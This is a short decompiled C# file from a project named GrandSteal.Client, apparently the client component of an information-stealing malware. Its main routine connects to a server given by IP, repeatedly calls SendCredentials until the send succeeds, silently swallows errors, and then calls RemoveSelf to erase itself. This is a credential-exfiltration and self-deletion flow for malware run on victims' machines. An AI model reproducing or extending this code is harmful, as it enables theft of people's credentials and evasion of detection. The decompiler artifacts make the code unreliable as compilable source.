using System;
using System.Runtime.CompilerServices;
using GrandSteal.Client.Data.Helpers;
using GrandSteal.Client.Data.Server;

namespace GrandSteal.Client.ViewModels
{
	// Token: 0x02000002 RID: 2
	public class AppViewModel
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000002 RID: 2 RVA: 0x00002052 File Offset: 0x00000252
		private ServerManager ServerManager
		{
			[CompilerGenerated]
			get
			{
				return this.<ServerManager>k__BackingField;
			}
		}

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000003 RID: 3 RVA: 0x0000205A File Offset: 0x0000025A
		private SetupManager SetupManager
		{
			[CompilerGenerated]
			get
			{
				return this.<SetupManager>k__BackingField;
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002062 File Offset: 0x00000262
		public AppViewModel(string IP, string ID = "TestID")
		{
			this.<SetupManager>k__BackingField = new SetupManager();
			this.<ServerManager>k__BackingField = new ServerManager(IP, ID);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000208C File Offset: 0x0000028C
		public void Run()
		{
			try
			{
				this.SetupManager.CheckUpdate();
				bool flag = false;
				if (this.ServerManager.Start()())
				{
					while (!flag)
					{
						flag = this.ServerManager.SendCredentials();
					}
				}
			}
			catch
			{
			}
			finally
			{
				this.SetupManager.RemoveSelf();
			}
		}
	}
}
